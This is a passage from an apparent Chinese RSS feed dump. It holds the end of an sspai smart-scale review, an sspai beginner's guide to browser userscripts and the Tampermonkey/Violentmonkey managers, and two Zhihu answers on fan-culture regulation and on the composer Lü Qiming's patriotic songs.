Mate | 欧姆龙\"><img src=\"https://cdn.sspai.com/2021/08/07/7aa4d90845c5813af635805a8d17ccaf.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/07/b6b32c6353682efcf8cdb24698c03075.png\" alt=\"\"></figure><p>体重秤本身倒也没有什么特别出彩的地方，常规设计，甚至还被云麦的创始人发微博吐槽过内部结构上「态度截然不同」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/07/article/82f6a83c9e07d6b04208bca2e7df5c70\"></figure><p>但对我来说，相比于云麦 App 带来的精神污染，内部结构真不是事。如果云麦也能有一款纯净的 App，那我一定第一个支持，价格翻几番都没问题。</p>\n<figure class=\"ss-imgRows\" figcaption=\"Withings Body+ 体重秤\"><img src=\"https://cdn.sspai.com/2021/08/11/17469d09af5c6760db2c99de1a2a7973.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/11/7575cd609db24ea6b6efd0c658be1023.jpg\" alt=\"\"></figure><p>相比国产体重秤，Withings Body+ 的优势在于硬件能满足我基本需求的同时，有非常好的软件体验，但也有一些不足之处。如果你很介意的话，那么这款产品可能并不适合你：</p>\n<ul>\n<li>手机初次连接体重秤异常繁琐复杂，且速度较慢，好在界面赏心悦目。</li>\n<li>初次连接成功后，倘若将体重秤长距离移动，则可能需要与手机重新连接一次。</li>\n<li>称重后，数据同步至手机可能需要 2-5 分钟，甚至有时需要在手机 App 内下拉刷新才显示最新数据。不像云麦的体重秤，手机甚至可以在称重时同步显示数据的变化。刚开始使用可能会担心数据是否会同步上，但其实并不用担心，每次连接上手机，都会一并同步之前尚未同步的称重数据。</li>\n<li>App 内虽然无广告，但可自定义程度仍然较低，不能按照自己的需要删掉不想要的模块。也存在类似于「今日步数」这类无法删除的牛皮癣。</li>\n<li>体重数据只能选择公斤，没有「斤」这个单位。</li>\n<li>目前国内在售的 Withings 体重秤，不是二手就是库存货，基本是不存在售后与质保的，不过我并不在意这一点，能把体重秤用坏的概率极低。</li>\n</ul>\n<p>同时，在 App 的各个小角落，会有对用户可能关心问题的解答，并且是没有任何广告引流的哦。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/08/11/59a8993b38cfbcd9da82efc889520630.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/11/2c1c3a241ee0cd6d5b634280a5bd396f.png\" alt=\"\"></figure><p>体重秤对于我来说，只是一个测量体重，并观察其趋势的工具。类似于脂肪、肌肉、蛋白质、骨量这些数据，我不相信准确性，也并不需要。</p>\n<p>倘若你也有类似的需求，但觉得没有广告的代价有些高昂，可以选择让自带的健康 App 读取你所购买品牌体重秤 App 的数据，也可以达到避免视觉污染的效果。</p>\n<h2>彩蛋</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/8f601c5d59c90053430c97dfbf715c1f.gif\"></figure><p>今晨收到了贵阳同事寄来的两盒「省医月饼」，一看外包装是食堂出品还有点惊讶，不过似乎是通过盒马买到的正品。云腿月饼咸香无比，几口就没有了。老麦的原话是「吃了一个还想吃下一个。」</p>\n<p>和这位热忱可爱善良的同事商量了一下，提前祝《新玩意》栏目的读者们中秋快乐。不过更值得关注的是下一句话：<strong>充电转发留言评论本文，抽一位幸运读者送出这份美味的云腿月饼。</strong></p>\n<p><strong>如果你也想分享「新玩意」🔉：</strong></p>\n<p>很多读者表示自己也有一些希望分享的有趣产品。为了能让更多读者参与，我们决定在「新玩意」栏目最后添加一个新的版块，邀请大家来 Matrix 社区发表文章分享你的「新玩意」，你只需要：</p>\n<ul>\n<li>在标题中标注「新玩意」</li>\n<li>用 500-1000 字介绍产品</li>\n<li>配上 1-2 张产品的实拍图片</li>\n<li><strong>在网站个人信息中补充支付宝账号</strong></li>\n</ul>\n<p>成功入选栏目还可以得到 108 元的「剁手抚恤金」🧧。如果你有兴趣参与，就赶紧来稿吧！</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a> ，了解更多的新玩意 🆒</p>\n<p>&gt; 特惠、好用的硬件产品，尽在 <a href=\"https://shop549593764.taobao.com/?spm=a230r.7195193.1997079397.2.2ddc7e0bPqKQHc\">少数派sspai官方店铺</a> 🛒</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68675"},{"title":"油猴使用指南 01：传说中的「油猴」与用户脚本","date":"2021-09-09 08:00:00","description":"\n<p>前一段时间在作者群里大家讨论，萌生了写个油猴脚本的想法，主要作用是给页面上增加一些好玩的功能。在写脚本的过程中，重新整理了一些关于油猴脚本的信息，也就有了本文。</p>\n<h2>油猴脚本：是什么、能干嘛？</h2>\n<p>油猴脚本，正式的叫法是用户脚本（user script）。之所以叫做「油猴」，是因为第一个制作这个浏览器扩展的作者 Aaron Boodman 起名叫做 Greasymonkey，中文直译就是「油腻的猴子」；后面其他脚本开发的时候，基本都在沿用 Greasymonkey 的一些基本规范，这些脚本也就统称为「油猴脚本」了。</p>\n<p>本文后续还是会采用本名「用户脚本」。</p>\n<p><strong>你可以将用户脚本理解为一种可以根据我们的实际需求，为网页「加料」的手段</strong>。如果你之前从来没有使用过用户脚本又想体验一下的话，可以按照以下步骤操作来快速感受一下它的魅力：</p>\n<ol>\n<li>下载浏览器扩展，绝大部分情况下我都推荐Tampermonkey，根据你使用的浏览器， 可以访问并安装：<ol>\n<li><a href=\"https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo\" target=\"_blank\">Chrome-Tampermonkey</a></li>\n<li><a href=\"https://addons.mozilla.org/firefox/addon/tampermonkey/\" target=\"_blank\">Firefox-Tampermonkey</a></li>\n<li><a href=\"http://tampermonkey.net/?browser=safari\" target=\"_blank\">Safari-Tampermonkey</a></li>\n</ol>\n</li>\n<li>找到脚本源，这里我把一个脚本发布在了 Greasyfork 上，大家可以点击 <a href=\"https://greasyfork.org/zh-CN/scripts/429067-%E5%B0%91%E6%95%B0%E6%B4%BE%E4%BD%9C%E8%80%85%E6%BF%80%E5%8A%B1%E5%99%A8\" target=\"_blank\">少数派作者激励器</a> 查看。</li>\n<li>页面中有一个绿色的安装按钮，点击就可以了。</li>\n</ol>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/01/579b95e19b2f2667fc5c77b3b825ba55.png\"></figure><p>安装好之后，访问我的 <a href=\"https://sspai.com/u/kokdemo/posts\" target=\"_blank\">作者文章页面</a> （或者你喜欢的其他作者），在右侧的「成就与徽章」这一部分，你就可以看到多出来了一个新的部分。如果这个作者太长时间没有更新，就会出现个红色的字体激励作者去写稿哦：</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/01/b6200f11fcf735003ca0638a9db4ef47.png\"><figcaption>这是一个效果示例</figcaption></figure><p>虽然这个脚本非常简单，但是看到这里，你已经了解了用户脚本最核心的功能了。</p>\n<h2>用户脚本的历史与不同版本</h2>\n<p>最早的时候，Firefox 火狐浏览器向开发者开放了扩展的能力，所有的开发者可以在火狐浏览器开放的能力内开发一些新的能力。 2004 年底，Aaron Boodman 在看到另一个用于精简网页的扩展的时候，想到了这个绝妙的点子，随机在 2005 年初发布了最初的 <a href=\"https://www.greasespot.net/2005/03/greasemonkey-025-xmlhttp-across.html\" target=\"_blank\">0.25版本</a> Greasymonkey。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/01/e996a3c173c5a92aedfb7d35c5d20ef5.png\"><figcaption>Greasymonkey 的火狐扩展界面</figcaption></figure><p>很快，大家就想到了通过 Greasymonkey 写一些用于屏蔽广告的脚本（这个习俗到现在都还有），但也被一些广告主吐槽。不过后面等到 ADblock 上线之后大家就转而去喷这一类扩展了。</p>\n<p>到了 2010 年，随着 Chrome 浏览器高歌猛进，另一位作者 Jan Biniok 开发了 Chrome 版本的用户脚本管理器扩展，起名叫做 Tampermonkey，直译应该叫做「篡改的猴子」。</p>\n<p>我个人觉得这个名字比 Greasymonkey 更贴切一些，符合用户脚本的实际作用。</p>\n<p>到目前为止，Tampermonkey 已经有超过千万的用户下载使用了，评分也非常高，是目前平台支持最完整的用户脚本扩展。Tampermonkey 在权限控制、脚本编辑和调试、全局黑白名单这些方面都做得相当不错，易用性相比 Greasymonkey 提升了不少。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/01/940ad4e8fa84f30e76db7aa819ddea4b.png\"><figcaption>Tampermonkey 的 Chrome 扩展界面</figcaption></figure><p>而 2013 年 Violentmonkey「暴力猴」的上线又解决了两个痛点：</p>\n<ul>\n<li>支持了遨游浏览器</li>\n<li>完全开源，地址见 <a href=\"https://github.com/violentmonkey/violentmonkey\" target=\"_blank\">GitHub</a>\n</li>\n</ul>\n<p>其实 Greasymonkey 也是开源的<sup class=\"ss-footnote\" href=\"https://github.com/greasemonkey/greasemonkey\" title=\"GitHub 地址\" footnote-id=\"1\">1</sup>，但到 Tampermonkey 诞生的时候并没有选择开源，而是以捐献软件的形式出现，这一点挺多人比较在意。暴力猴迭代到现在，也更新了非常多版本，支持的平台已经覆盖了所有主流的浏览器平台，不过界面上还是比较简单。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/01/d30382fe825ef0c6840485ac93596449.png\"><figcaption>Violentmonkey 的 Chrome 扩展界面</figcaption></figure><p>这几款主流的浏览器扩展的支持情况见下表，如果有不当请留言指正。</p>\n<figure class=\"table\"><table><tbody>\n<tr>\n<td>浏览器</td>\n<td>Greasymonkey</td>\n<td>Tampermonkey</td>\n<td>Violentmonkey</td>\n</tr>\n<tr>\n<td>Chrome</td>\n<td> </td>\n<td>支持</td>\n<td>支持</td>\n</tr>\n<tr>\n<td>Edge</td>\n<td> </td>\n<td>支持</td>\n<td>支持</td>\n</tr>\n<tr>\n<td>Safari</td>\n<td> </td>\n<td>支持</td>\n<td> </td>\n</tr>\n<tr>\n<td>Firefox</td>\n<td>支持</td>\n<td>支持</td>\n<td>支持</td>\n</tr>\n<tr>\n<td>Opera</td>\n<td> </td>\n<td>支持</td>\n<td>支持</td>\n</tr>\n<tr>\n<td>Vivaldi</td>\n<td> </td>\n<td> </td>\n<td>支持</td>\n</tr>\n<tr>\n<td>Maxthon 遨游</td>\n<td> </td>\n<td> </td>\n<td>支持</td>\n</tr>\n<tr>\n<td>Dolphin</td>\n<td> </td>\n<td>支持</td>\n<td> </td>\n</tr>\n<tr>\n<td>UC</td>\n<td> </td>\n<td>支持</td>\n<td> </td>\n</tr>\n</tbody></table></figure><h2>用户脚本的原理浅析</h2>\n<p>当然了，如果要用严谨一点的定义来说，用户脚本其实是一种注入式的 JavaScript 程序，在网页本身的程序之外，通过一些手段，将用户需要的数据和逻辑注入到当前的网页中，达到修改界面、增加功能等等的目的。</p>\n<p>换句话说用户脚本也是 JavaScript。JavaScript 能实现的能力，用户脚本基本也能做，比如操作页面元素，可以给页面中增加、删减、修改页面元素，最常见的去广告脚本就是这么实现的。</p>\n<p>不过用户脚本能提供一些普通 JavaScript 实现不了的能力。Greasymonkey 在最早的 0.25 版本中就带来了两个基本的功能：</p>\n<ul>\n<li>GM_xmlhttpRequest：用于发起跨域请求</li>\n<li>GM_registerMenuCommand：当用户操作菜单时，触发一个行为</li>\n</ul>\n<p>这两个功能到现在为止仍然非常核心，这里稍微解释一下背景。</p>\n<h3>跨域请求</h3>\n<p>为了安全起见，浏览器在页面加载的时候会有一个同源策略，如果页面中的 javaScript 来自另一个域名，浏览器就会认为这个不安全不让其加载运行，但有的时候用户可能会有一些别的需求。</p>\n<p>举个例子：<strong>比如说在京东或者当当上买书的时候，想看一下豆瓣上用户的评分</strong>，这种情况下就需要用到用户脚本的这个能力了。在京东的页面中，我们就可以借助用户脚本调用这个 <code>GM_xmlhttpRequest</code> 的 API 去访问豆瓣平台的查询接口。</p>\n<h3>菜单操作</h3>\n<p>很多情况下，用户脚本不需要自动执行，而是需要使用者来手动运行，这时就需要 <code>GM_registerMenuCommand</code> 了，在点击之后，触发一个写好的函数，就可以完成改变页面数据，或者发起某些请求的情况。</p>\n<p>举个例子：<strong>我在页面中看到一个不认识的单词，想要查询一下</strong>，这时候选中这个单词，然后触发这个接口，就可以实现查询的效果（当然也有很多的别的能力可以实现划词查询）。</p>\n<p>除了这两个功能之外，目前的用户脚本，大多采用了 Greasemonkey 制定的 <a href=\"https://wiki.greasespot.net/Greasemonkey_Manual:API\" target=\"_blank\">V4 API 规范</a>。通过这个规范，我们就能知道用户脚本可以做什么了。</p>\n<ul>\n<li>本地存储数据：这个能力和浏览器自带的 <code>localStorage</code> 比较像，可以给予用户脚本存储一些数据的能力。比如一些个性化的用户设置（譬如一张可爱的背景图）、用户数据（你关注的股票和基金）等等。</li>\n<li>获取外部资源：譬如从外部的地址获取图片、CSS 文件等等。</li>\n<li>发起浏览器提醒：调用浏览器右上角的那种提醒，可以指定文字图片和点击之后的效果。</li>\n<li>打开一个新页面：这个就很好理解，就是打开一个新的页面……</li>\n<li>设置剪贴板：这个能力可以访问你的剪贴板并给里面塞进去指定的内容。</li>\n</ul>\n<p>在 V3 版本的 API 中，还多了几个能力，包括：</p>\n<ul>\n<li>插入 CSS 样式</li>\n<li>下载文件</li>\n</ul>\n<p>不过上述的几个用户脚本扩展也出现了一些自己的差异，比如 Tampermonkey 就支持了插入节点的能力，也支持获取当前标签页面信息的能力。</p>\n<p>如果你是一个用户脚本开发者，需要注意一下这些差异点。</p>\n<h2>从哪里获取用户脚本</h2>\n<p>指望每一个人都去自己写脚本是不现实的，这需要大家有一些基本的前端开发能力。大部分的用户都是去找一些现成的脚本来使用，这就是所谓的「脚本源」。</p>\n<p>最早期的脚本源，最有名的是 userscript.org 站点，不过由于维护不力，导致后面充斥着各种各样的有害脚本，非常影响大家使用。目前这个站点已经下了，我也没有给它加上可以点击的超链接。</p>\n<p>如果你想体验，可以访问 https://userscripts-mirror.org/ 这个链接来找到之前的老脚本。</p>\n<p>当然我更推荐下面的几个脚本源：</p>\n<ul>\n<li>\n<a href=\"https://greasyfork.org/\" target=\"_blank\">GreasyFork</a> 可能是目前量最大的源，最开始让大家体验的 <a href=\"https://wvsjslugj8.feishu.cn/docs/(https://greasyfork.org/zh-CN/scripts/429067-%E5%B0%91%E6%95%B0%E6%B4%BE%E4%BD%9C%E8%80%85%E6%BF%80%E5%8A%B1%E5%99%A8\" target=\"_blank\">少数派作者激励器</a>也是这个平台中托管的</li>\n<li>\n<a href=\"https://openuserjs.org/\" target=\"_blank\">OpenUserJS</a> 另一个开放的脚本源</li>\n<li><a href=\"https://www.userscript.zone/\" target=\"_blank\">Userscript.Zone</a></li>\n</ul>\n<p>当然，直接在 GitHub 上去找脚本也是个不错的选择。</p>\n<h2>用户脚本 vs. 浏览器扩展</h2>\n<p>在上面提到的划词翻译这个例子中我们其实引入了这样一个问题：<strong>同样一个需求，如果浏览器扩展和用户脚本都能实现，我们应该如何选择？</strong></p>\n<p>一方面，浏览器扩展相比用户脚本诞生的时间其实更晚，各家的浏览器扩展后发制人，的确也有了比用户脚本强得多的功能实现；但另一方面，虽然脚本能力有限，但是它们占用的系统资源和内存又更少一点。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/01/a6d2ad65d9a4fe9fdef05597036c4fb2.png\"><figcaption>我的 Chrome 扩展们占用了不少内存</figcaption></figure><p>另外，从安全性角度上来说，用户脚本虽然也爆出过不少 <a href=\"https://userscripts-mirror.org/topics/704c575.html?page=6\" target=\"_blank\">窃取个人信息</a>、替换返利链接<sup class=\"ss-footnote\" href=\"\" title=\"有的脚本作者也会直接在介绍中表示靠返利来补贴服务器费用等，是否要继续安装就看使用者自己了。\" footnote-id=\"2\">2</sup>甚至 <a href=\"https://www.sohu.com/a/227226907_115128\" target=\"_blank\">挖矿</a> 的负面新闻，但用户脚本的源代码审查相比浏览器扩展更为直接透明，选择合适的用户脚本获取渠道、留意脚本的权限请求，有基础的用户也可以多多留意、检查脚本内容，一般就能规避大部分风险。</p>\n<p>因此我自己的解决方案是，对于轻量一些的场景，通过用户脚本+用户样式（user style）解决大部分浏览需求，重一些的场景则会选择浏览器扩展。当然了，如果你的设备对保密性和安全等级有着较高的要求，我还是不建议你安装任何用户脚本。</p>\n<h2>结语</h2>\n<p>用户脚本作为一个 17 年前的互联网老古董，现如今仍有自己的用武之地，还是十分令人感慨。但作为油猴使用指南的第一期，本文仅为增加大家对「油猴脚本」的一点了解，如果你想解锁用户脚本的全部实力、甚至自己动手制作用户脚本，还请留意本系列的后续内容更新。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68574"},{"title":"如何看待「光明日报」刊文：「粉丝控评就是一种网络暴力」？","date":"2021-09-09 07:28:52","description":"\n<h2>小艺有话说 | “饭圈”正畸，美育必不可少</h2>\n<p><br></p>\n<p><i>针对“饭圈”乱象问题，中央网信办重拳出击，在6月启动“清朗·‘饭圈’乱象整治专项行动”，8月27日公布《关于进一步加强“饭圈”乱象整治的通知》，提出取消明星艺人榜单、优化调整排行规则、严管明星经纪公司等十项措施，开展严厉整治。</i></p>\n<p><i>曾一度愈演愈烈的“饭圈”乱象，导致了集资应援、谩骂互撕、拉踩引战等一系列非理性事件。为何粉丝陷入“饭圈”难以自拔？“饭圈”乱象的形成原因有很多，包括行业风气不正、平台监管不严、教育培训不足等。<b>而“美育的缺失”也是导致粉丝文化乱象，“饭圈”畸形审美产生的原因之一。</b></i></p>\n<p><br></p>\n<h3><b>“饭圈”审美怎么了？</b></h3>\n<p><br></p>\n<p><b>强化片面审美，颜值即正义。</b>“饭圈”的概念引自国外，与日韩偶像工业模式一同进入国内市场。偶像的培养模式是经过市场检验的一套标准化流程，选人以及培养过程都非常严苛。曾有多位艺人在采访中表示，练习生阶段每天的训练超过十二个小时，而每天只能吃一盘沙拉。偶像严格迎合着“白瘦美”的所谓审美观，并且不断刷新着上限，塑造可望不可及的“神仙颜值”。<b>“饭圈”群体缺乏对美的全面认知，被形象美的强烈观感影响，陷入了颜值即正义的片面观念之中。</b>在“爱的滤镜”下，艺人作品的优劣显得无足轻重。在各类演出视频弹幕上经常可以看见来自粉丝的解释：“他（她）第一次参演电视剧，已经很好了”“这段演唱肯定是被恶意修音，请移步饭拍视频，见识他（她）的真实唱功”的留言飘过。而一旦艺人发胖、颜值下滑，则是真正的“饭圈大事”，轻则掉粉，重则引起骂战。偶像形象的宣传维护是“饭圈”的重点工作之一，“饭圈”审美观下的饭制美图、饭制视频常常带有厚重的滤镜，艺人在“白瘦美”的基础上，被渲染的更加唇红齿白、肤若凝脂，印证了“饭圈”颜值至上的审美倾向。</p>\n<p><b>缺少审美品格，让爱化作偏执。</b>爱美之心，人皆有之。美育概念的提出者席勒认为，<b>“审美是使人具有精神文化修养并真正禀赋人性的唯一途径”。</b>“饭圈”具有发现美的能力，他们能充分挖掘艺人身上的闪光点，通过持续的关注，宣传艺人从事文艺工作的努力、付出、坚持等美好品质。这些正能量有时化作动力，让粉丝自身在榜样的力量下变得更好；<b>而有时则化作非理智的崇拜与维护，成为熬夜刷榜、打投、集资、拉踩的“兴奋剂”。</b>央广网记者调查国内一家知名娱乐公司，发现在其去年一场投票活动中，粉丝共花费逾<b>550万元</b>。这样的投票活动每年不止一次，也不止一家。“饭圈”喊着“关注作品、不上升真人”的口号，却锱铢必较着番位、排名等围绕着艺人个人名利的问题。这些非理性行为不符合审美的初衷，甚至影响了文艺作品的创作。例如，男女主角番位、偶像团体站位、艺人出镜次数等方面的口舌之战屡屡爆发，制作方不得不将这些问题考虑进去，因此改变了作品拍摄的正常思路。<b>美的艺术应该是怡性悦情的，“饭圈”的审美缺乏正确的引导，缺少审美品格，让爱美之心变得偏执、盲目。</b></p>\n<p><b>私欲膨胀，审美自觉匮乏。</b>作为有严格内部纪律的网上社群，“饭圈”内部存在着等级和“鄙视链”。不花钱、不产出宣传物料的粉丝是“白嫖粉”；更受“尊重”的粉丝往往都在产出图文、视频物料，或者投入资金；起到舆论领袖作用的被称为“大粉”。<b>在这样的等级制度下，“饭圈”从欣赏偶像，变成了欣赏自己。</b>“饭圈”内部人员为了得到关注和认可，制造焦虑、发布煽动性言论，加重了“饭圈”环境的污染，导致所谓的“饭圈文化”向着道德滑坡和低俗倾向滑落下去。<b>“饭圈”的这些满足私欲的行为，已经将审美抛在一边。</b>中国文艺评论家协会理事、北京大学艺术学院院长彭锋认为，<b>“‘饭圈文化’披着审美和艺术的外衣，但它不是真正的审美。对于这种貌似审美、实质反审美的‘饭圈文化’，可以从不同方面去整治，但如果要根治，就需要加强培养真正的审美敏感力和鉴赏力。”</b></p>\n<p><br></p>\n<h3><b>“饭圈”正畸，美育必不可少。</b></h3>\n<p><br></p>\n<p>美育倡导者蔡元培认为：<b>“美育者，与智育相辅而行，以图德育之完成者也”</b>。对于“饭圈”乱象，中国文艺评论家协会副主席、中国文学艺术基金会副理事长兼秘书长向云驹认为，<b>“治本之策就在于要回到艺术和美育，用美育解决某些Z世代、网生代的审美畸形和社会失范。”</b></p>\n<p><b>美育刻不容缓。</b>近年来饭圈低龄化特点也越来越明显，《2020年全国未成年人互联网使用情况研究报告》统计，我国未成年网民参加粉丝应援的比例达到<b>8%</b>，其中初中生群体是主要参与者；2020年，半月谈杂志社对全国2万多名12岁至18岁中学生开展“青少年追星调查”，调查显示，有<b>42.2%</b>的中学生自小学就开始了追星生活，有<b>52%</b>的中学生追星时间在3年以上。面对尚不成熟的追星文化，青少年们需要通过美育强化自身的审美素养、道德品质，理性面对追星，养成健康观念，自觉抵御不良风气。</p>\n<p><b>美育是“心育”，是“人的教育”。</b>加强美育，不止能够改善“饭圈”的畸形审美，还起到培养人们健全三观的重要作用。早在1995年，教育部便提出开展包括审美教育等重要内容在内的文化素质教育。近期，教育界发布“双减”政策，提到充分用好课后服务时间，为学有余力的学生开展丰富多彩的科普、文体、艺术、劳动、阅读、兴趣小组及社团活动，促进学生的全面发展；2020年10月由中共中央办公厅、国务院办公厅印发《关于全面加强和改进新时代学校美育工作的意见》旨在以提高学生审美和人文素养为目标和弘扬中华美育精神，以美育人、以美化人、以美培元及把美育纳入各级各类学校人才培养全过程。2021年5月，全国学校体育美育工作推进会召开，筹划如何加强新时代学校体育美育工作，培养智体美劳全面发展人才。</p>\n<p><b>不仅学生应当接受美育，全民都应提倡美育。</b>海南师范大学教师侯志国认为，<b>“越来越多的从业者接受对美的教育，我们的社会将变得更加美好。”</b>特别是今年两会期间，十三届全国人大四次会议的全国人大代表、中国艺术研究院中国油画院院长杨飞云曾就“普及全民美育”提出建议。他说，<b>“文化艺术不仅是文化人与艺术家的事情，而是整个社会、民族的事业：重视文化、审美质量的提升。以国民精神文明内在的富足和社会主义现代化物质文明的丰富，共同造就民族复兴的新时代！”</b></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-wen-yi-wang?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国文艺网</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/484386745/answer/2111390503?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">211 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/374904448?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">在明星新闻下刷“哦”“……”“？？？”的行为是否属于网络暴力？</a><br><a href=\"http://www.zhihu.com/question/484385426?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">光明日报:粉丝控评是种网络暴力，你如何看？</a><br>\n","link":"http://www.zhihu.com/question/484386745/answer/2111390503?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"有哪些红歌是非常好听的？","date":"2021-09-09 06:48:36","description":"\n<p><b>2007年，嫦娥一号飞上太空，《谁不说俺家乡好》作为由大众选出的30首歌曲之一，伴随嫦娥一号响彻太空，这也不由得让人想起了今年6月17日9时22分发射成功的神舟十二号载人飞船，</b>时代更迭、岁月变迁但保卫家乡、建设家乡的感情代代传承，这首热爱家乡、赞美家乡的歌曲也会被久久传唱！</p>\n<p><br></p>\n<p><b>“一座座青山紧相连，一朵朵白云绕山间。一片片梯田一层层绿，一阵阵歌声随风传。哎，谁不说俺家乡好，得儿哟依儿哟……”</b>1963年，吕其明为电影《红日》所作的插曲《谁不说俺家乡好》，传唱大江南北。电影《红日》的故事发生地在山东,吕其明经历过山东解放战争，也学习过大量山东民间音乐，加上此前创作《弹起我心爱的土琵琶》的经验，所以对完成作曲任务抱有信心。他认真阅读小说原著，做了充分的案头工作，把整个创作计划、音乐设计等都安排妥当。</p>\n<p><br></p>\n<p>在和导演汤晓丹反复研究的过程中，吕其明建议，中间要增加一首歌曲。因为这部电影围绕战争叙事，从头到尾非常紧张，都是战斗的大场面。写一首插曲，能让电影起承转合得更从容一些，有张有弛，这样才有味道。汤导接受了吕其明的建议。对于歌曲应该写什么，吕其明认为：<b>要写就写对家乡的感情。不仅是反映孟良崮人民对家乡的热爱，也要反映出解放军战士热爱家乡、保卫家乡的革命乐观主义精神</b>，在音调与节奏上要与后面表现孟良崮战斗场面的音乐形成强烈对比，给人以更加深入的艺术感受。</p>\n<p><br></p>\n<p>而这首红歌的创作者正是<b> “七一勋章”获得者、作曲家吕其明！</b></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-f523d2dec469f03fbc794a4f863f2b73_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"748\" data-rawheight=\"1327\" data-watermark=\"original\" data-original-src=\"v2-f523d2dec469f03fbc794a4f863f2b73\" data-watermark-src=\"v2-30cf5ea3709583ddd9df2ac56b211bf5\" data-private-watermark-src=\"v2-ee44a3853ff37aeb8cad291c892c830b\"></p>\n<p><br></p>\n<p>吕其明，男，汉族，1930年5月生，1945年9月入党，安徽无为人，上海电影制片厂艺术委员会原副主任。新中国培养的第一批交响乐作曲家，著名电影音乐作曲家，一生坚持歌颂党、歌颂祖国、歌颂人民。70年来先后为《铁道游击队》《焦裕禄》《雷雨》等200多部（集）影视剧作曲，创作《红旗颂》《使命》等10余部大中型交响乐作品，300多首歌曲，《弹起我心爱的土琵琶》等歌曲广为传唱。荣获“全国离退休干部先进个人”等称号和“中国音乐金钟奖·终身成就奖”。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-6ebc4f150a7e72763031033b50e4e491_720w.webp?rss\" data-caption=\"2021年6月29日，吕其明获颁“七一勋章”。\" data-size=\"normal\" data-rawwidth=\"869\" data-rawheight=\"1023\" data-watermark=\"original\" data-original-src=\"v2-6ebc4f150a7e72763031033b50e4e491\" data-watermark-src=\"v2-f0dda1667b74a3e4a86ba6235dbe416d\" data-private-watermark-src=\"v2-a88460f674d121930e94b57db21c26ff\"></p>\n<p><br></p>\n<p><b><i>“我所有的作品中，都融入了我对党、对祖国、对人民的热爱。只有这样的作品，与听众的情感有了交汇点，产生了共鸣，才能听得懂、传得开、留得下。”——吕其明</i></b></p>\n<p><br></p>\n<p>10岁参加新四军，15岁加入中国共产党，成长于硝烟战火中的吕其明，用音乐表达着对党、对祖国、对人民深沉的热爱。从<b>《弹起我心爱的土琵琶》</b>到<b>《谁不说俺家乡好》</b>再到<b>《红旗颂》</b>，那深沉的爱在乐曲中交汇共鸣。</p>\n<p><br></p>\n<p>吕其明谱写了无数经典乐章，曾先后为200余部（集）电影、电视剧作曲，并创作了10余部大、中型器乐作品，以及300余首不同体裁和形式的声乐作品，他的作品在几代人的心中唱响。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-627568fa2e7f1369c994ebd9e705b4ea_720w.webp?rss\" data-caption=\"吕其明多年来坚持创作，笔耕不辍。\" data-size=\"normal\" data-rawwidth=\"409\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-627568fa2e7f1369c994ebd9e705b4ea\" data-watermark-src=\"v2-0d4b82ff8f21389973f0a53c2b518786\" data-private-watermark-src=\"v2-59b3bc307a6926aca2a8195f27a76d34\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-f69a4ef771b4fa10c636164c4d01f5fe_720w.webp?rss\" data-caption=\"2020年上海重点舞台艺术创作剧本研讨会上，90岁的吕其明坚持出席听取各方面专家对作品的建议。\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1435\" data-watermark=\"original\" data-original-src=\"v2-f69a4ef771b4fa10c636164c4d01f5fe\" data-watermark-src=\"v2-01dd5c3f018299de013241e6a35abc6d\" 